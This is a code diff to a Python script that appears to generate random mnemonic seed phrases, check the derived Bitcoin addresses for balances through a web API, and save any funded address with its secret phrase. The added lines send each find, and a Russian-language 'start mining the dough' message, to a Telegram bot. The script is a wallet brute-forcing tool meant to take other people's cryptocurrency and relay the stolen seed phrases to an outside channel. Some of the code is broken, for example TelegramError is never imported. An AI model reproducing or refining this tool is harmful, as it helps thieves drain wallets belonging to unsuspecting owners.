@@ -2,6 +2,16 @@ import mnemonic
 import bitcoin
 import requests
 import time
+from telegram.bot import Bot
+
+bot = Bot(token="YOUR_TOKEN")
+chat_id = your_chat_id
+
+try:
+    bot.send_message(chat_id=chat_id, text="Начинаем майнить бабло)")
+except TelegramError as e:
+    print("Error sending message to Telegram: ", e)
+    # You can add any additional error handling here
 
 address_count = 0
 while address_count < 1000000:
@@ -30,13 +40,17 @@ while address_count < 1000000:
         print("Checking address: ", address)
         print("Balance: ", balance)
         print("Number of transactions: ", transactions)
-
+        
         if balance > 0 or transactions > 0:
             with open("good.txt", "w") as f:
                 f.write(address + " : " + secret_phrase)
+                message = address + " : " + secret_phrase
+                bot.send_message(chat_id=chat_id, text=message)
             break
                         
+    elif response.status_code == 404:
+        print(f"Address {address} not found")
     else:
-        print("Request failed")
+        print(f"Request failed with status code {response.status_code}")
     time.sleep(5)
     address_count += 1
